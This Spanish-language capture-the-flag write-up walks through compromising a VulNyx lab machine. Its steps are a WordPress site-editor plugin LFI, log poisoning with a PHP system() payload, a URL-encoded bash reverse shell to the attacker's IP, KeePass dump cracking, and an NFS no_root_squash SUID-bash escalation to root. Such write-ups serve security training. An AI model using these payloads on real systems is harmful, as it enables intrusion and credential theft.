# Fase 1- Tanteo
![image](https://github.com/haw441kings/WriteUps-VulNyx/assets/136659799/0394ead3-61cd-4e53-b064-3aba80a967e0)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.

### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados
#### Puertos Abiertos:

1. **22/tcp (SSH):** OpenSSH 9.2p1
2. **80/tcp (HTTP):** Apache httpd 2.4.57
3. **111/tcp (RPCBIND):** 2-4 (RPC #100000)
5.  **37031/tcp (nlockmgr)**: 64 1-4 (RPC #100021)
6.  **37611/tcp (mountd)** :   64 1-3 (RPC #100005)
7. **41745/tcp (status)**:  64 1 (RPC #100024)
8. **51797/tcp (mountd)**:    64 1-3 (RPC #100005)
9. **55615/tcp (mountd)**:  64 1-3 (RPC #100005)

### Puerto 80
Al identificar que el puerto 80 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador. Esto llevó a acceder a la página por defecto de Apache en la máquina vulnerable, confirmando así el correcto funcionamiento del servidor web Apache en Debian. La página por defecto de Apache en Debian muestra el mensaje "Apache2 Debian Default Page".
![image](https://github.com/haw441kings/WriteUps-VulNyx/assets/136659799/696bdf1e-4c55-4e21-b3eb-c6010803b359)

# Fase 2- Exploración

#### FeroxBuster
![image](https://github.com/haw441kings/WriteUps-VulNyx/assets/136659799/803dfadc-b8db-43cc-8c36-48156fb93d10)
El resultado de feroxbuster:
```
301      GET        9l       28w      316c http://192.168.1.12/wordpress => http://192.168.1.12/wordpress/
200      GET      368l      933w    10701c http://192.168.1.12/index.html
200      GET       24l      127w    10359c http://192.168.1.12/icons/openlogo-75.png
200      GET      368l      933w    10701c http://192.168.1.12/
```
Tenemos un directorio llamado `wordpress`.

#### Wordpress
![image](https://github.com/haw441kings/WriteUps-VulNyx/assets/136659799/d0c4a86b-6967-46c4-a2d0-acc8d7c6ffac)
Al dirigirnos a la pagina, nos dice que no se puede acceder al sitio.

![image](https://github.com/haw441kings/WriteUps-VulNyx/assets/136659799/d6d83743-ecfe-4d2c-b3dc-0f984ff2636e)

Lo agregamos a nuestro /etc/hosts.

![image](https://github.com/haw441kings/WriteUps-VulNyx/assets/136659799/25e31dc3-91bd-4716-93d9-cb0223280aaf)
Y ya la tenemos...

#### Wordpress
![image](https://github.com/haw441kings/WriteUps-VulNyx/assets/136659799/208985e6-1cdd-4809-b38a-fc100a3e7c34)
La pagina usa wordpress. Vamos a realizar un escaneo.

![image](https://github.com/haw441kings/WriteUps-VulNyx/assets/136659799/7de1a307-41cf-42d5-9e51-4471605fb105)
Nos identifico el plugin `site-editor v1.1.1`.

# Fase 3- Explotación

#### 1.1.1
![image](https://github.com/haw441kings/WriteUps-VulNyx/assets/136659799/0df36338-9f92-4817-a41f-df5b303a53ad)
Buscando con Searchsploit encontramos que es vulnerable a local file inclusion.

![image](https://github.com/haw441kings/WriteUps-VulNyx/assets/136659799/2c492594-fc07-4a66-875f-ac04af73b721)
Segun el exploit basta con ejecutar esto:
```
http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```
Y con eso vamos a poder leer archivos internos.

![image](https://github.com/haw441kings/WriteUps-VulNyx/assets/136659799/756a9914-ff07-4281-8545-0f11bd50fc07)
Y se logro.

#### Access.log
![image](https://github.com/haw441kings/WriteUps-VulNyx/assets/136659799/8cad4cdc-fd21-4c15-b684-adb4383c8bc5)
Ya que estamos enfrente de un servidor apache, nos fijamos si podemos leer el archivo acess.log. Y podemos.

![image](https://github.com/haw441kings/WriteUps-VulNyx/assets/136659799/e8547f37-b819-40a6-8d9c-7c8b559bda2f)
Con curl a través de USER-AGENT enviamos un whoami, y revisando el acess.log encontramos que somos el usuario www-data, tenemos ejecución remota de comandos.
Lo estamos haciendo aquí es una explotación de una **vulnerabilidad de ejecución remota de código (RCE)** aprovechando una vulnerabilidad de **Local File Inclusion (LFI)**.

Le vamos a mandar este comando:
```c
curl "http://shared.nyx/wordpress/" -H "User-Agent: <?php system(\$_GET['shell']); ?>"
```
Este comando nos proporciona una shell para poder ejecutar una reverse shell.

Le vamos a mandar el siguiente comando: 
```c
curl "http://shared.nyx/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/log/apache2/access.log&shell=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.2%2F4444%200%3E%261%27"
```
En este comando estoy escapando los caracteres especiales usando la codificación URL.

![image](https://github.com/haw441kings/WriteUps-VulNyx/assets/136659799/4b0e588f-88c1-44f9-9dd4-631a441703ca)
Y estamos dentro.

# Fase 4- Privilegios

#### A--A
![image](https://github.com/haw441kings/WriteUps-VulNyx/assets/136659799/fbc17cc2-9871-4dd9-9593-3ec99c93c0a7)

Indagando el la maquina encontré un directorio en /var/www/html/wordpress/backups, con un archivo llamado `cp-sharedbbdd.zip`, entonces procedí a compartírmelo a mi maquina atacante.

#### PWM
![image](https://github.com/haw441kings/WriteUps-VulNyx/assets/136659799/a4856d15-e9f7-434e-a520-90efa2633429)

`KeePass.DMP` parece ser un archivo con extensión `.DMP` asociado con KeePass, un administrador de contraseñas de código abierto. Estos archivos suelen contener información de volcado de memoria (dump), así que procedemos a usar la herramienta KeePwn, con el archivo que había en el mismo directorio. Llamado sharedbbdd.kdbx.

![image](https://github.com/haw441kings/WriteUps-VulNyx/assets/136659799/be4bf379-2f4b-4db8-804e-2247b0989894)

Y encontramos la contraseña.

![image](https://github.com/haw441kings/WriteUps-VulNyx/assets/136659799/75dcdd9a-0837-49f1-b81a-2e5277990969)

Dentro podemos ver los usuarios.

![image](https://github.com/haw441kings/WriteUps-VulNyx/assets/136659799/1f773234-35ae-4afa-be96-cf0d3ef6bcbc)

Y nos conectamos por ssh al usuario jackondor.

# Fase 4- Privilegios

#### sudo -l
Usando el recurso de [hacktricks](https://book.hacktricks.xyz/v/es/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe) me doy cuenta de que esas carpetas ahora me servirán para escalar privilegios. Siguiendo los pasos de **hacktricks** me voy a mi equipo y como **root** creo la carpeta `/privesc` en el directorio `/tmp`.

```
❯ mkdir /tmp/privesc
```

Monto un directorio remoto ubicado en el servidor **NFS** con la dirección IP **192.168.1.145** y la ruta `/shared/tmp` en mi directorio local `/tmp/privesc`.

```
❯ mount -t nfs 192.168.1.145:/shared/tmp /tmp/privesc
```

Entro en el directorio `/tmp/privesc`, copio el binario `/bin/bash` y le doy permisos **SUID**.

```
❯ cd /tmp/privesc
❯ cp /bin/bash .
❯ chmod +s bash
```

En la máquina objetivo entro en la carpeta `/shared/tmp` y veo el binaro **bash** con permisos **SUID**.
```
cd /shared/tmp
ls
bash
ls -la
bash
```

Obtengo el root de la siguiente forma.
```
./bash -p
id
jackondor
whoami
root
```
Maquina Terminada con privilegios maximos
